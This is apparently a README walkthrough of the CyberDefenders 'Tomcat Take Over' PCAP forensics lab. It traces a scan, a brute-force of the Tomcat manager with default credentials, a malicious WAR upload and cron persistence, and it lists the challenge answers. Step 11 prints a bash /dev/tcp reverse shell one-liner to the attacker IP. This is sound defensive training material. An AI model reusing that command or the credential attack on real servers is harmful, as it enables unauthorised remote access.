# 🐱 Tomcat Take Over Lab – CyberDefenders Walkthrough

This project is a full investigation of the **Tomcat Take Over** PCAP challenge on [CyberDefenders.org](https://cyberdefenders.org). It simulates a real-world web server compromise via Apache Tomcat.

Each slide in this repo represents a step I took to analyze and investigate the PCAP file, extract evidence, and answer key forensic questions.

---

## 🛠️ Tools Used

- **Wireshark** – PCAP packet analysis  
- **CyberChef** – Base64 decoding  
- **AbuseIPDB** – IP geolocation  
- **Notepad** – File inspection  
- **PowerShell** – File hashing  
- **Google / OSINT** – Tomcat version lookup  
- **ChatGPT** – Reverse shell decoding  

---

## 🧪 Analysis Steps

### 1. Initial Review in Wireshark  
![](images/slide1.png)  
Opened the PCAP and noted time range: 14 minutes and 30 seconds. Total packets captured: **21,070**.

---

### 2. Protocol & Traffic Overview  
![](images/slide2.png)  
Analyzed Protocol Hierarchy and Conversation statistics. Noted key IP pair: `14.0.0.120 ↔ 10.0.0.112`.

---

### 3. Port Activity & Suspicious Files  
![](images/slide3.png)  
Observed traffic on ports: **8080, 22, 445, 80, 443**. Identified two PDFs: `work_request2024.pdf` – hashed and verified via VirusTotal.

---

### 4. SSH and HTTP Activity  
![](images/slide4.png)  
Noted early SSH packets (starting at packet 137), first HTTP activity from packet 685. Followed the HTTP stream.

---

### 5. Signs of SYN Scan  
![](images/slide5.png)  
IP `14.0.0.120` displayed numerous SYN requests — likely performing a port scan.

---

### 6. Identifying Open Ports  
![](images/slide6.png)  
Open ports on Apache Tomcat server: **22, 8080, 8009**.

---

### 7. POST Requests and File Upload  
![](images/slide7.png)  
Spotted suspicious POST with `.war` file named `JXQOZY.war`, indicated by ZIP header (PK).

---

### 8. Tomcat Admin Access Attempt  
![](images/slide8.png)  
HTTP 401 errors and repeated `GET` requests to `/manager/html` endpoint indicated brute-force login attempts.

---

### 9. Decoding Credentials  
![](images/slide9.png)  
Decoded base64 strings like `YWRtaW46YWRtaW4=` with CyberChef – revealed default credentials like `admin:admin`.

---

### 10. Successful Login  
![](images/slide10.png)  
Found successful login with credentials `admin:tomcat`.

---

### 11. Execution of Reverse Shell  
![](images/slide11.png)  
Discovered shell execution command:  
`/bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1'`

---

### 12. Crontab Entry for Persistence  
![](images/slide12.png)  
Post-exploitation behavior included a scheduled crontab task for maintaining access.

---

## 🧩 Challenge Questions & Answers

1. **Attacker's IP Address:** `14.0.0.120`  
2. **Origin Country:** China (verified via AbuseIPDB)  
3. **Port for Admin Panel:** `8080`  
4. **Enumeration Tool Used:** Gobuster (`user-agent: gobuster/3.6`)  
5. **Admin Directory Discovered:** `/manager/html`  
6. **Successful Login Credentials:** `admin:tomcat`  
7. **Malicious File Name:** `JXQOZY.war`  
8. **Persistence Mechanism:** Crontab entry running a reverse shell command

---

## ✅ Conclusion

This lab simulated an end-to-end web server compromise through Apache Tomcat. The attacker performed a scan, brute-forced admin credentials, uploaded a `.war` reverse shell, and established persistence. Each step was documented with evidence from the PCAP file.

This project strengthened my skills in packet analysis, threat detection, and red team methodology — with a strong focus on documentation and forensic accuracy.

---

